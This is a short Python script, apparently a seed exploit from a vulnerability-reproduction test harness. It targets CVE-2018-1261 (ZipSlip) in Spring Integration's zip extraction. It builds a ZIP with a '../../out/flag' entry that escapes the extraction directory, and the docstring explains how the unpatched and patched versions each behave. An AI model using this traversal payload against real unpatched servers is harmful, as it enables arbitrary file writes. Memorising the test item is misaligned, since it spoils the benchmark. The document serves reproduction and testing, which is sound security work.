#!/usr/bin/env python3
"""[GIVEN] CVE-2018-1261 ZipSlip seed exploit for pivotal-spring-integration-zip-cve-2018-1263.

The classic ZipSlip / archive-traversal vector: a ZIP entry whose name contains "../" so that, when the REAL
UnZipTransformer unpacks it via ZipResultType.FILE (the framework writes each entry itself), it is written
OUTSIDE the extraction root (workDirectory). UnZipTransformer.doZipTransform writes each FILE entry to:

    tempDir         = new File(workDirectory, message-id-uuid)      // /work/dest/<uuid>
    destinationFile = new File(tempDir, zipEntryName)               // /work/dest/<uuid>/<name>

    entry name:  ../../out/flag       (a plain regular-file entry, content = ${PCB_FLAG})
    workDir:     /work/dest
    resolves to: /work/out/flag       (OUTSIDE /work/dest; the escape dir /work/out is pre-created by the service)

On V0 (1.0.0.RELEASE) doZipTransform has NO check -> the resolved path /work/out/flag is written directly via
`new FileOutputStream(destinationFile)` and the flag lands outside workDir (REACHES). On V1 (1.0.1.RELEASE,
CVE-2018-1261 patched) the FILE branch adds
`if (zipEntryName.contains("..") && !destinationFile.getCanonicalPath().startsWith(workDirectory.getCanonicalPath())) throw`,
so the "../../out/flag" entry is rejected with "... is trying to leave the target output directory ..." and
nothing is written (BLOCKED). The block on V1 is specifically the guard the CVE-2018-1261 fix added.

The flag is a per-run random ${PCB_FLAG} token; here it is the CONTENT the escaped write deposits at the witness
path /work/out/flag (state-write canary). The service reads that witness after extraction; if it holds the token,
containment was escaped. The upload is fired over REAL external HTTP: POST /unzip?mode=file.
"""
from __future__ import annotations

import base64
import io
import zipfile

# Escaping entry: name traverses out of /work/dest/<uuid> to the sibling escape dir /work/out (OUTSIDE workDir).
ESCAPE_ENTRY = "../../out/flag"


def build_zip(flag: str) -> bytes:
    """A zip with a single plain regular-file entry whose name traverses out of workDir via '../..'."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr(ESCAPE_ENTRY, flag)   # arcname stored verbatim, incl. the "../.." traversal
    return buf.getvalue()


def candidate(flag: str):
    return {
        "id": "cve-2018-1261-file-dotdot-zipslip",
        "mode": "file",                              # POST /unzip?mode=file  -> ZipResultType.FILE
        "zip_b64": base64.b64encode(build_zip(flag)).decode("ascii"),
    }


if __name__ == "__main__":
    import json
    print(json.dumps(candidate("PCBFLAG_demo"), indent=2))
